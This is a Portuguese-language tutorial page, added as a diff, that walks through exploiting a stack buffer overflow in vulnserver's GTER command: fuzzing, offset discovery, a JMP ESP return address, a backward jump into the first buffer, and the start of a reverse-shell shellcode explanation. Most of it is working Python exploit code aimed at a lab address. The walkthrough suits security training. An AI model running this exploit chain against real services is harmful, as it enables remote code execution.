@@ -1,0 +1,803 @@
+<h1 id="comando-gter">COMANDO GTER</h1>
+
+<p>O comando GTER, assim como os demais, recebe um argumento e dá uma resposta. Neste comando, temos uma situação parecida com a anterior, porém encontramos uma problema com o espaço disponível para nosso shellcode, portanto precisaremos de uma técnica um pouco mais complexa.</p>
+
+<p><img src="/img/std/winbof/winbof-20.png" alt="Enumaração do comando." /></p>
+
+<p>Sabendo de seu funcionamento, vamos fazer o fuzzing do comando.</p>
+
+<h2 id="fuzzing">FUZZING</h2>
+
+<p>Assim como fizemos com o comando TRUN, vamos utilizar o protocolo Spike. Para tanto, vamos criar nosso script.</p>
+
+<p>gter.spk</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s_string<span class="o">(</span><span class="s2">"GTER "</span><span class="o">)</span><span class="p">;</span>
+s_string_variable<span class="o">(</span><span class="s2">"*"</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Onde:
+  <strong>s_string</strong>: é um parâmetro imutável, no nosso caso, sempre irá enviar “TRUN ” (não esqueça do espaço após o TRUN);
+  <strong>s_string_variable</strong>: é um parâmetro que indica o que seŕa mudato em cada envio.</p>
+
+<p>Antes de enviar o fuzzing, vamos iniciar o wireshark monitorando nossa conexão.</p>
+
+<p><img src="/img/std/winbof/winbof-21.png" alt="Enumaração do comando." /></p>
+
+<p>Com o programa iniciado na máquina Windows, vamos enviar nosso fuzzing com o script “generic_sender_tcp”.</p>
+
+<p><img src="/img/std/winbof/winbof-22.png" alt="Enumaração do comando." /></p>
+
+<p>Podemos ver que na terceira iteração, o programa parou de responder, automaticamente fechou na máquina Windows.
+Analisando o dump no WIreshark, podemos verificar o que foi enviado.</p>
+
+<p><img src="/img/std/winbof/winbof-23.png" alt="Enumaração do comando." /></p>
+
+<p>Podemos observar que o buffer estouruou com 5060 bytes, sendo que o nosso buffer inicia com “/.:/”.</p>
+
+<h2 id="exploração">EXPLORAÇÃO</h2>
+
+<p>Agora que sabemos que o programa sofreu um crash com 5061 bytes, já incluindo o comando “GTER /.:/”, podemos iniciar o esboço do exploit.</p>
+
+<p>xplgter.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.30"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># payload a ser enviado
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5060</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span> 
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Enviando payload..."</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Payload enviado!"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Precisamos iniciar o vulnerver, mas agora com o Immunity Debbuger e rodar nosso script.</p>
+
+<p><img src="/img/std/winbof/winbof-24.png" alt="Enumaração do comando." /></p>
+
+<p>Novamente conseguimos sobrescrever o EIP com “41414141”, o que é ótimo, pois conseguimos controlar o endereço da próxima execução após o overflow.</p>
+
+<p>Mas se seguirmos o dump do ESP, podemos ver que temos apenas 20 bytes para inserir nosso shellcode, o que é praticamente impossível uma vez que ele ocupa aproximadamente 350 bytes.</p>
+
+<p>Teremos que usar uma técnica diferente para conseguirmos nossa shell.</p>
+
+<p>Isso também mostra que talvez nem precisemos de todos os 5060 bytes que nosso fuzzing encontrou, vamos criar nosso próprio script para encontrar um fuzzing mais próximo.</p>
+
+<p>fuzzing.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.30"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span> <span class="c1"># quantidade inicial de bytes 
+</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">100</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Buffer estourado em %s bytes"</span><span class="o">%</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))))</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/img/std/winbof/winbof-25.png" alt="Enumaração do comando." /></p>
+
+<p>Temos o offset de 309 bytes para criarmos nosso payload.</p>
+
+<p>Sabendo disso, precisamos encontrar o offset preciso para atingir o EIP, vamos utilizar o msf-pattern_create para criar uma string distinta.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 309             
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2
+
+</code></pre></div></div>
+
+<p>Vamos inserí-lo em nosso script.</p>
+
+<p>xplgter.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.30"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># payload a ser enviado
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5060</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+#payload += b"A" * offset 
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Enviando payload..."</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Payload enviado!"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Após reiniciar o vulnserver no Immunity, vamos rodar o script e monitorar o comportamento.</p>
+
+<p><img src="/img/std/winbof/winbof-26.png" alt="Enumaração do comando." /></p>
+
+<p>Temos o endereço de EIP de 41396541, vamos consultar no msf-pattern_offset.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 309 <span class="nt">-q</span> 41396541
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 147
+</code></pre></div></div>
+
+<p>Sabemos que o offset para atingir o EIP é de 147, vamos enviar 147 “A” + 4 “B” e o restande de “C” para validar. Se o offset estiver correto, nosso EIP será preenchido com “42424242” e os outros 20 bytes com “43”.</p>
+
+<p>xplgter.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.30"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># payload a ser enviado
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">147</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">309</span> <span class="o">-</span> <span class="mi">147</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Enviando payload..."</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Payload enviado!"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Após reiniciar o vulnserver no Immunity, vamos rodar nosso script e monitorar seu comportamento.</p>
+
+<p><img src="/img/std/winbof/winbof-27.png" alt="Enumaração do comando." /></p>
+
+<p>Conseguimos atingir com precisão o EIP com nossos “42”.</p>
+
+<p>Ainda temos o problema de espaço de 20 bytes para tentar executar alguma coisa, mas antes de atacar este problema, vamos encontrar um bom endereço de retorno.</p>
+
+<h2 id="encontrando-um-bom-endereço-de-retorno">ENCONTRANDO UM BOM ENDEREÇO DE RETORNO</h2>
+
+<p>O nosso payload vai sobrescrever o buffer, o EIP e o ESP, logo, nosso shellcode será armazenado no ESP, por tanto, precisamos manipular nosso EIP para que aponte para o endereço do ESP. Como sabemos que os endereços da stack são dinâmicos, vamos procurar um JMP ESP conforme fizemos no comando anterior.</p>
+
+<p><img src="/img/std/winbof/winbof-28.png" alt="Enumaração do comando." /></p>
+
+<p>Encontramos nossos 9 bons endereços de retorno.</p>
+
+<h2 id="inserindo-o-endereço-de-retorno-no-payload">INSERINDO O ENDEREÇO DE RETORNO NO PAYLOAD</h2>
+
+<p>Em posse do endereço de retorno, vamos adicionar um deles no lugar de nossos B, eu vou utilizar o 625011d3, porém a notação para envio tem que ser em little indian, portanto os bytes tem ordem inversa, ficando: <code class="language-plaintext highlighter-rouge">\xd3\x11\x50\x62</code>.</p>
+
+<p>Vamos atualizar o exploit.</p>
+
+<p>xplgter.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.26"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># payload a ser enviado
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">147</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span> <span class="c1"># buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd3\x11\x50\x62</span><span class="s">"</span> <span class="c1"># endereco de retorno
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">309</span> <span class="o">-</span> <span class="mi">147</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="c1"># segundo buffer
+</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Enviando payload..."</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Payload enviado!"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Precisamos reiniciar o vulnserver no Immunity, mas antes de rodar nosso script, vamos setar um breakpoint exatamente no nosso endereço de retorno: 625011d3.
+(clicando em “Go to address in Disassembler”, inserindo nosso endereço de retorno e logo em seguida pressionando F2).
+Agora podemos rodar nosso script.</p>
+
+<p><img src="/img/std/winbof/winbof-29.png" alt="Enumaração do comando." /></p>
+
+<p>O programa parou exatamente onde setamos o breakpoint. Ao pressionarmos F7, vamos cair exatamente onde começam nossos “C”(43).</p>
+
+<p><img src="/img/std/winbof/winbof-30.png" alt="Enumaração do comando." /></p>
+
+<p><strong>Nota de interpretação</strong>: Veja que nos registradores o EIP está em 00cff9c8 e a linha onde esta instrução cai exatamente onde está nosso primeiro 43 no disassembler. (note que no EIP temos 00cff9c8 e no disassembler temos 0cff9c7, existe 1 byte de diferença, mas se observamos o conteúdo, vemos que temos “6243 43”, ou seja, se o 62 corresponde ao endereço 00cff9c7, logo o próximo byte que é nosso 43 será 00cff9c8).</p>
+
+<p>Caímos exatamente onde esperávamos, mas agora temos que resolver o problema: o que fazer com apenas 20 bytes de espaço?</p>
+
+<p>Simples, não podemos fazer nada! Precisamos de um buffer maior, e nós o temos.
+O buffer onde estão os “A”, pois ele possui 147 bytes, o que não é muito, mas nos permite utilizar algumas técnicas.</p>
+
+<p>Mas vem a questão, se o buffer de “A” já foi utilizado para preencher o buffer primário do programa, como podemos reutilizá-lo?</p>
+
+<h2 id="saltando-entre-endereços-de-memória">SALTANDO ENTRE ENDEREÇOS DE MEMÓRIA</h2>
+
+<p>Sabemos que ao cair no buffer dos “C”, precisamos pular de volta para o buffer dos “A”.</p>
+
+<p>Na arquitetura x86 temos um jump incondicional que pode pular para qualquer endereço da memória, mas para utilizá-lo, precisamos saber exatamente para onde pular.</p>
+
+<p>Porém os endereços dos buffers esão na stack, o que siginifica que vão mudar toda vez que executarmos o programa.</p>
+
+<p>Vamos rodar o script novamente e observar que os endereços mudaram. Observe a imagem abaixo que mostra exatamente onde se inicia nossos “C”.</p>
+
+<p><img src="/img/std/winbof/winbof-31.png" alt="Enumaração do comando." /></p>
+
+<p>Sabemos que desta vez eles se iniciam em 00d8f9c8, se rolarmos a barra pra cima, encontraremos o endereço correspondente ao nosso primeiro “A”.</p>
+
+<p><img src="/img/std/winbof/winbof-32.png" alt="Enumaração do comando." /></p>
+
+<p>Nosso primeiro “A” está em 00d8f931, porém estes endereços são da stack e vão mudar a cada vez que executarmos o programa.</p>
+
+<p>Precisamos pular do endereço do primeiro “C” para o primeiro “A”, mas os endereços não são fixos, o que fazer?</p>
+
+<p>Simples, os endereços mudam, mas a distância matemática entre eles não, se eu souber quantos bytes devo pular, sempre cairei exatamente onde quiser. Existem algumas formas de calcular esta distância, vamos explorar duas alternativas.</p>
+
+<h2 id="encontrando-a-distância-com-immunity-debbuger">ENCONTRANDO A DISTÂNCIA COM IMMUNITY DEBBUGER</h2>
+
+<p>Se clicarmos duas vezes na instrução disassembler do nosso primeiro “C”, podemos inserir o comando “JMP 00d8f931” que é o endereço do nosso primeiro “A”.</p>
+
+<p><img src="/img/std/winbof/winbof-33.png" alt="Enumaração do comando." /></p>
+
+<p>Ao clicarmos em “Assemble”, ele nos retorna a distância entre os dois endereços.</p>
+
+<p><img src="/img/std/winbof/winbof-34.png" alt="Enumaração do comando." /></p>
+
+<p>Ele nos deu a distância e965ffffff, porém temos que ter cuidado, pois ele está comparando com o 00d8f9c7, mas sabemos que nosso primeiro “C” está em 00d8f9c8, portanto temos que subtrair 1 byte da distância, resultando em e964ffffff.</p>
+
+<p>Agora sabemos a distância do salto, então, independente do endereço que os buffers possam cair, podemos encontrar nosso endereço de destino.</p>
+
+<p>Antes de testar outra abordagem para calcular o salto, vamos testar em nosso script.</p>
+
+<p>Vamos adicionar nosso salto no script logo após o salto para o EIP.</p>
+
+<p>xplgter.py:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="s">"192.168.1.30"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># payload a ser enviado
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">147</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span> <span class="c1"># buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd3\x11\x50\x62</span><span class="s">"</span> <span class="c1"># endereco de retorno
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe9\x64\xff\xff\xff</span><span class="s">"</span> <span class="c1"># salta para o primeiro buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">309</span> <span class="o">-</span> <span class="mi">147</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="c1"># segundo buffer
+</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Enviando payload..."</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Payload enviado!"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="entendendo-o-payload">Entendendo o payload</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"GTER /.:/"</span> <span class="c1"># funcao inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span> <span class="c1"># buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd3\x11\x50\x62</span><span class="s">"</span> <span class="c1"># endereco de retorno
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe9\x64\xff\xff\xff</span><span class="s">"</span> <span class="c1"># salta para o primeiro buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">309</span> <span class="o">-</span> <span class="mi">147</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="c1"># segundo buffer
+</span></code></pre></div></div>
+<ol>
+  <li>Ele vai enviar o comando inicial “GTER /.:/”;</li>
+  <li>Ele vai enviar nosso primeiro buffer com 147 “A”;</li>
+  <li>Ele vai enviar para o EIP o endereço de retorno para nosso ESP;</li>
+  <li>Aqui ele envia o salto para cair novamente no inicio do buffer de “A”;</li>
+  <li>Agora ele envia o restante dos “C” onde 309 é o offset para buffer overflow, -4 para descontar os 4 bytes do endereço de retorno e -5 bytes do salto.</li>
+</ol>
+
+<p>Vamos reiniciar o programa novamente com o breakpoint em 625011d3 que é nosso endereço de retorno e rodar nosso script.</p>
+
+<p><img src="/img/std/winbof/winbof-35.png" alt="Enumaração do comando." /></p>
+
+<p>Ele parou em nosso endereço de retorno, conforme esperado, agora pressionamos F7 para ir para próxima instrução.</p>
+
+<p><img src="/img/std/winbof/winbof-36.png" alt="Enumaração do comando." /></p>
+
+<p>Veja que agora, ao invés de cair em nosso primeiro “C”, ele caiu em um JMP. Se pressionarmos F7 novamente, cairemos onde esse JMP nos levar.</p>
+
+<p><img src="/img/std/winbof/winbof-37.png" alt="Enumaração do comando." /></p>
+
+<p>O salto foi precisamente para nosso primeiro “A” com sucesso.
+Agora que sabemos uma das formas de encontrar o tamanho do salto, vamos tentar descobrir este valor com outra abordagem.</p>
+
+<h2 id="encontrando-a-distância-do-salto-com-msf-nasm_shell">ENCONTRANDO A DISTÂNCIA DO SALTO COM MSF-NASM_SHELL</h2>
+
+<p>Antes de irmos para ferramenta em si, temos que saber quantos bytes separam nosso endereço de origem (nosso primeiro “C”) do nosso endereço de destino (nosso primeiro “A”). O que já sabemos é que temos 147 “A”, então partimos desse principio, se observarmos novamente a imagem onde consultamos os endereços, veremos que temos alguns bytes entre o umltimo “A” e o primairo “C”.</p>
+
+<p><img src="/img/std/winbof/winbof-38.png" alt="Enumaração do comando." /></p>
+
+<p>Entre eles temos os bytes D3, 11, 50 e 62, ou seja, temos 147 bytes de “A” + 4 bytes separando os buffers, ou seja, temos 151 bytes entre os endereços de origem e destino.</p>
+
+<p>Sabendo este valor, podemos consultar o <code class="language-plaintext highlighter-rouge">msf-nasm_shell</code> com o comando <code class="language-plaintext highlighter-rouge">JMP $-151</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msf-nasm_shell 
+nasm <span class="o">&gt;</span> JMP <span class="nv">$-</span>151
+00000000  E964FFFFFF        jmp 0xffffff69
+</code></pre></div></div>
+
+<p>E ele nos trouxe exatamente o tamanho do salto que encontramos com o Immunity: e964ffffff.
+Ambas as tecnicas são váilidas e podem ser usadas.</p>
+
+<p>Temos um buffer maior, agora com 147 bytes, mas sabemos que nosso reverse shell ou outros tipos de shell ocupam mais que 300 bytes, o que podemos fazer com o que temos?</p>
+
+<p>Antes de responder esta pergunta, precisamos entender a anatomia de um reverse shell.</p>
+
+<h2 id="anatomia-do-reverse-shell">ANATOMIA DO REVERSE SHELL</h2>
+
+<p>Quando geramos um reverse shell com o msfvenom, recebemos como resposta uma serie de bytes, mas estes bytes tem toda uma arquitetura.</p>
+
+<p>Um reverse ou bind shell nada mais é do que uma série de APIs do Windows que são ordenadas de forma que, ao serem chamadas, fazem uma conexão reversa com o atacante chamando uma instância geralmente do cmd.exe.</p>
+
+<p>Basicamente a ordem das chamadas segue:</p>
+
+<ol>
+  <li>Chama a API WSAStartup() para carregar as DLLs Winsock do Windows;</li>
+  <li>Chama a API connect() ou WSASocketA() para criar um socket bind ou uma conexão reversa com o IP do atacante;</li>
+  <li>Chama a API CreateProcessA() que por sua vez vai chamar o cmd.exe e redirecionar o STDIN, o STDOUT e o STDERR para o socket criado.</li>
+</ol>
+
+<p>Como nosso alvo é um server TCP, existe uma grande chance das DLLs WinSock já estarem carregadas, e isso vai nos economizar muitos bytes na criação do shellcode.</p>
+
+<p>A ideia é reutilizar as APIs já carregadas nativamente no programa para minimizar o tamanho do nosso shellcode.</p>
+
+<p>Para desenvolvermos este shellcode, precisamos entender como funcionam as APIs que precisamos e como funcionam seus parâmetros, e traduzí-las para Assembly.</p>
+
+<p>Uma observação importante, é que temos que evitar os badchars na construção do código, em nosso caso só temos o “\x00”.</p>
+
+<p>Vamos utilizar a própria documentação da Microsoft para nos auxiliar no processo.</p>
+
+<p>A primeira API que vamos configurar é a WSASocketA() cuja documentação pode ser lida <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa">aqui</a>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SOCKET</span> <span class="n">WSAAPI</span> <span class="nf">WSASocketA</span><span class="p">(</span>
+  <span class="kt">int</span>                 <span class="n">af</span><span class="p">,</span>
+  <span class="kt">int</span>                 <span class="n">type</span><span class="p">,</span>
